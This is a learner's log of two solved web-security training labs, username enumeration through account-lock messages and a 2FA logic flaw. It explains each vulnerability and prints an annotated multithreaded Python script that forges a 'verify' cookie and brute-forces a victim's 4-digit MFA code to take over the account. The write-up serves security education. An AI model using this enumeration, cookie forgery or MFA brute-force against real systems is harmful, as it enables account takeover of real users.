# Day 39: Username Enumeration via Account Lock, and 2FA Broken Logic Solved with a Custom Python Script

- Lab: Username enumeration via account lock, solved (Practitioner)
- Lab: 2FA broken logic, solved (Practitioner)

Roadmap: A07 Authentication Failures, 8 of 14 Authentication labs solved.

## What I learned

### Username enumeration via account lock

Burp Intruder's Cluster bomb attack gave confusing results at first (every response came back the exact same length, which didn't make sense). Solved it instead by testing each candidate username manually, one at a time, and watching the response carefully. Found the valid username was `ao`. Then ran a normal Sniper attack against the password list for that username and found the password, `taylor`.

- Some lock-based logins will show a different error message, "You have made too many incorrect login attempts," once a specific username has failed enough times in a row. If that message only shows up for one username out of the whole candidate list, that username is confirmed to be real
- Doing it manually, slower but in a guaranteed exact order, worked where the automated attack didn't, a good reminder that when an automated attack gives a suspicious, too-uniform result, it's worth testing a slower, simpler version by hand to sanity check it

### 2FA broken logic

This lab needed a big detour. The official solution says to brute-force a 4-digit security code (10,000 possible combinations) using Burp Intruder. In Burp Suite Community Edition, Intruder is heavily throttled, so this brute-force alone was taking 3 to 4 hours and still hadn't finished.

Since Community Edition can't do this fast, I switched to writing a Python script instead, no Burp needed at all for this part, since Python can send as many requests at once as I want with no artificial slowdown. Claude wrote the script and I ran it, and we had to fix it three separate times before it actually worked, each failure taught something new about how the vulnerability actually works.

**The vulnerability itself:**

- After logging in with my own account (wiener), the server needs to know whose 2FA code to check when I submit one. It decides this using a cookie called `verify`
- Normally, after you log in, the server sets `verify` to your own username automatically. The bug is that the server trusts whatever value this cookie holds, it never checks that it actually matches who really logged in
- So if I manually set that cookie's value to `carlos` myself, the server generates a fresh 2FA code for carlos's account instead of mine, and then checks any code I submit against carlos's code, not mine, all while I'm still sitting in my own logged-in session

**Mistakes made along the way, and what each one taught:**

1. First attempt sent `verify=carlos` as part of the URL (`?verify=carlos`) instead of as an actual cookie. The server completely ignored this and quietly set the real `verify` cookie back to `wiener` behind the scenes. This meant every brute-force attempt was actually just guessing my own real code by accident, not carlos's, which is why it kept "succeeding" with different numbers each time, it was just eventually finding my own code, not breaking into carlos's account
2. After fixing that and sending `verify` as a real cookie, the script tried guessing 10,000 codes with 10 requests running at the same time, to go faster. One of those 10 would find the right code, but because they all shared one connection, the other 9 requests failing at nearly the same moment were overwriting that success with their own failure information before the script could use it properly. The fix was to grab a copy of the key cookie the instant the right code was found, before any other request could interfere with it, then use that saved copy separately and cleanly, completely isolated from the parallel guessing
3. Also tried calling the "generate a new code for carlos" step a second time to confirm the result, not realizing that step itself always replaces the current code with a brand new one, which cancelled out the code just found. The fix was to never call that step again once a working code is found, just reuse it immediately

**Final proof it worked:** the page returned `Your username is: carlos`, `Your email is: carlos@carlos-montoya.net`, landed on the URL `/my-account?id=carlos`, fully logged in as him.

## My notes on the final working script, explained simply

```python
import re
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
```

- `requests` is the library that actually sends web requests from Python, the same kind of GET and POST requests Burp sends, just from code instead of clicking buttons
- `ThreadPoolExecutor` and `as_completed` let many requests run at the same time instead of one after another, which is what makes this so much faster than Burp Community's throttled version
- `threading` and its `Event` are used as a shared "stop now" signal, so that once one request finds the right code, all the others still running can be told to give up instead of wasting time
- `re` (regular expressions) is used later just to strip HTML tags out of a page so the plain text underneath can be read

```python
discovery_session = requests.Session()
```

A `Session` object remembers cookies automatically across multiple requests, the same way a browser does, so I don't have to manually carry the login cookie forward myself on every single request

```python
discovery_session.get(f"{LAB_URL}/login")
login_resp = discovery_session.post(
    f"{LAB_URL}/login",
    data={"username": MY_USERNAME, "password": MY_PASSWORD},
    allow_redirects=False,
)
```

This logs in normally with my own real credentials, exactly like typing them into the login page myself. `allow_redirects=False` stops the library from automatically following the page's redirect, so I can see the raw status code myself (302 means success) instead of it being hidden

```python
trigger_resp = discovery_session.get(f"{LAB_URL}/login2", cookies={"verify": VICTIM_USERNAME})
```

This is the actual exploit step. Sending `cookies={"verify": "carlos"}` forces that specific cookie's value on this one request, overriding whatever the session would normally use, which tricks the server into generating a fresh 2FA code for carlos instead of for me

```python
captured_session_cookie = discovery_session.cookies.get("session")
```

This grabs a plain copy of the session's login cookie right at this exact moment, before anything else can change it. This turned out to be the critical fix, saving a safe copy before the messy parallel guessing starts

```python
def try_code(code):
    if stop_event.is_set():
        return None
    resp = discovery_session.post(
        f"{LAB_URL}/login2",
        data={"mfa-code": code},
        cookies={"verify": VICTIM_USERNAME},
        allow_redirects=False,
    )
    location = resp.headers.get("Location", "")
    if resp.status_code == 302 and "my-account" in location:
        return code
    return None
```

This is one single guess. It submits one 4-digit code, still forcing `verify=carlos` on this request too. If the server responds with a 302 redirect that points somewhere containing "my-account", that's the success signal, meaning this code was correct

```python
with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    futures = {executor.submit(try_code, code): code for code in codes}
```

This is what actually runs 10 of those guesses at the same time instead of one by one, which is the entire reason this is faster than Burp Community Edition

```python
clean_session = requests.Session()
final_resp = clean_session.post(
    f"{LAB_URL}/login2",
    data={"mfa-code": found_code},
    cookies={"verify": VICTIM_USERNAME, "session": captured_session_cookie},
    allow_redirects=True,
)
```

Once the correct code is known, this starts a completely fresh, brand new session, untouched by any of the earlier parallel guessing, and manually hands it the exact session cookie that was saved earlier plus `verify=carlos`, then submits the one known-correct code by itself, cleanly, with nothing else happening at the same time to interfere

## Key takeaways

- Burp Suite Community Edition's Intruder throttling is a real, practical limit, not just an inconvenience, for any lab needing a large brute force like 10,000 codes. Writing a small Python script using the requests library is a legitimate, much faster alternative for exactly this situation
- A cookie that controls "whose data am I looking at" is only safe if the server actually checks it against who is really logged in. If the server just trusts whatever the cookie says, that cookie becomes something I can set myself
- Running many requests in parallel against one shared session can cause a race condition, where one request's success gets stepped on by another request's failure happening at nearly the same instant. The fix is to pull out and save whatever you need the moment it's confirmed correct, before anything else gets a chance to change it
- Some setup steps, like generating a fresh 2FA code, invalidate what came before them if called again. Once something valuable is found, stop touching the part of the process that created it
